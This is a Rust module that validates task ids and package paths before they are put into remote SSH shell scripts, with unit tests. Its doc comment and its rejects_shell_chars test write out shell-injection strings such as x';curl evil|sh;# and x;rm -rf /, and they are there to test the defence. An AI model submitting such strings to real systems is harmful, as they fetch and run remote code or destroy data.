//! Task-id / package-name validators for fields that flow into shell
//! strings.
//!
//! Security audit (04 SSH polling task_id, audit
//! 05 figure_id elsewhere). Several executor paths interpolate
//! a caller-supplied `task_id` directly into shell scripts:
//!
//! * `crates/harness/src/executor/slurm/polling.rs::probe_container_state`
//!   builds an SSH command that pastes `task_id` and `package_dir` into
//!   a bash script run on the remote login node.
//! * `crates/harness/src/executor/pilot.rs::sanitize_task_id` (the
//!   prior owner of this logic) scrubs task ids before they land in
//!   pilot artifact paths.
//!
//! Without validation a hostile task id such as `x';curl evil|sh;#`
//! becomes a literal shell statement on the remote side. The validator
//! here refuses anything outside `^[A-Za-z0-9_.-]+$` (POSIX-portable
//! identifier shape, length ≤ 128) so the interpolation is safe.
//!
//! Module is named with a leading `_` so it sits at the top of the
//! `executor/` directory alphabetically next to other shared helpers
//! (a convention the codebase already uses for
//! `crates/server/src/chat_routes/_path_jail.rs`).

/// Maximum task-ID length in bytes. Set to 128 to keep the full SSH command
/// line (which embeds task_id in argv across the SLURM/AWS staging scripts)
/// well below `ARG_MAX` on Linux (typically 128 KiB) even after argv
/// concatenation with package paths, environment, and the wrapper script.
/// Lowering is safe; raising risks `E2BIG` on remote execution and is a
/// shell-injection surface — must be paired with stricter character-set
/// validation.
const MAX_SAFE_ID_LENGTH_BYTES: usize = 128;

/// Typical task-ID shape `<stage>_<sample>` rarely exceeds this. Used only
/// for the "is this an unusually long ID?" diagnostic; not a hard limit.
#[allow(dead_code)]
const TYPICAL_TASK_ID_LENGTH: usize = 64;

/// Returns true when `id` matches `^[A-Za-z0-9_.-]+$` and length
/// ≤ `MAX_SAFE_ID_LENGTH_BYTES`.
///
/// `MAX_SAFE_ID_LENGTH_BYTES` is generous for task ids (the typical shape
/// is `<stage>_<sample>` ≤ `TYPICAL_TASK_ID_LENGTH` chars) but bounds shell
/// command length on the remote side: SSH scripts compose multiple task-id
/// substitutions into a single command, and unbounded ids could blow past
/// `ARG_MAX`.
pub fn is_safe_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= MAX_SAFE_ID_LENGTH_BYTES
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
}

/// Borrow-preserving validator. Returns the input unchanged on success
/// (the borrow chain stays intact for shell interpolation), or an
/// error string describing why the id was refused. Use when the call
/// site needs a literal `&str` to pass through unchanged.
pub fn sanitize_task_id(id: &str) -> Result<&str, String> {
    if is_safe_id(id) {
        Ok(id)
    } else {
        Err(format!("unsafe task id: {id:?}"))
    }
}

/// Is `package_dir` shell-safe for remote interpolation? Allows
/// forward slashes (the remote path is absolute) but every non-`/`
/// segment must satisfy the standard task-id rules
/// (`^[A-Za-z0-9_.-]+$`). Refuses leading `-` (would be misread as
/// a flag by downstream `cat`/`find`/etc.) and `//` collapses (a
/// sign of accidental concatenation that hints at upstream bugs).
/// Empty path is refused — callers always pass a populated path.
///
/// Shared between the SLURM polling path and the AWS SSM probe
/// path so both apply the same defense.
pub fn package_dir_is_safe(path: &str) -> bool {
    if path.is_empty() || path.len() > 4096 {
        return false;
    }
    if path.starts_with('-') {
        return false;
    }
    // One leading `/` is allowed (absolute path). Any other empty
    // segment is `//` and refused.
    let segments: Vec<&str> = path.split('/').collect();
    if segments.is_empty() {
        return false;
    }
    for (i, segment) in segments.iter().enumerate() {
        if segment.is_empty() {
            // Only the very first segment can be empty (the leading `/`).
            // Trailing or middle empty segments → `//` collapse → refuse.
            if i == 0 && segments.len() > 1 {
                continue;
            }
            return false;
        }
        if !is_safe_id(segment) {
            return false;
        }
    }
    // After validation, ensure the path actually contains at least one
    // non-empty segment (refuses bare `/`).
    segments.iter().any(|s| !s.is_empty())
}

/// Allocation-bound normalizer. Replaces every disallowed byte with
/// `_` and returns a new String. Used by pilot bookkeeping paths
/// (artifact filenames, JSON keys) where the id is recorded but does
/// NOT flow into shell — refusing a malformed id would lose telemetry.
///
/// IMPORTANT: never use this for shell interpolation. The `_`
/// substitution is one-way; an attacker who chooses a hostile id that
/// would collide with a legitimate one after normalization can
/// confuse downstream readers. For shell paths use `sanitize_task_id`
/// (refuse) instead of this (normalize).
pub fn normalize_task_id_for_filename(id: &str) -> String {
    // Kept in sync with `is_safe_id`'s accepted-character set so a
    // value that passes `is_safe_id` is never mangled by the normalizer.
    // In particular `.` must be passed through (not dropped) — otherwise
    // ids collide like "step-3.fastqc" → "step-3_fastqc".
    id.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' {
                c
            } else {
                '_'
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_shell_chars() {
        assert!(!is_safe_id("x';curl evil|sh;#"));
        assert!(!is_safe_id("x y"));
        assert!(!is_safe_id("x\"y"));
        assert!(!is_safe_id("x`id`"));
        assert!(!is_safe_id("x$(id)"));
        assert!(!is_safe_id("x;rm -rf /"));
        assert!(!is_safe_id("x|sh"));
        assert!(!is_safe_id("x>out"));
        assert!(!is_safe_id("x\nrm"));
    }

    #[test]
    fn rejects_empty_and_overlong() {
        assert!(!is_safe_id(""));
        let too_long = "a".repeat(129);
        assert!(!is_safe_id(&too_long));
    }

    #[test]
    fn accepts_canonical() {
        assert!(is_safe_id("data_import"));
        assert!(is_safe_id("step-3.fastqc"));
        assert!(is_safe_id("bulk_rnaseq_de_sample_001"));
        assert!(is_safe_id("a"));
        assert!(is_safe_id(&"x".repeat(128)));
    }

    #[test]
    fn sanitize_returns_borrow_on_safe_id() {
        let s = "ok_id-1";
        let v = sanitize_task_id(s).expect("safe id");
        assert!(std::ptr::eq(s.as_ptr(), v.as_ptr()));
    }

    #[test]
    fn sanitize_refuses_unsafe_id() {
        let err = sanitize_task_id("x;rm").expect_err("unsafe id must be refused");
        assert!(err.contains("unsafe task id"), "got {err:?}");
    }

    #[test]
    fn normalize_replaces_disallowed_chars() {
        assert_eq!(
            normalize_task_id_for_filename("task/with:slash"),
            "task_with_slash"
        );
        assert_eq!(
            normalize_task_id_for_filename("normal_task-01"),
            "normal_task-01"
        );
        assert_eq!(normalize_task_id_for_filename("a b\tc"), "a_b_c");
    }

    /// W6.3 — any id that passes `is_safe_id` must round-trip through
    /// `normalize_task_id_for_filename` unchanged. The two are kept in
    /// sync to defeat the prior footgun where `.` was accepted by the
    /// validator but rewritten by the normalizer.
    #[test]
    fn normalize_preserves_safe_ids_with_dots() {
        assert_eq!(
            normalize_task_id_for_filename("step-3.fastqc"),
            "step-3.fastqc"
        );
        assert_eq!(normalize_task_id_for_filename("a.b.c"), "a.b.c");
    }
}
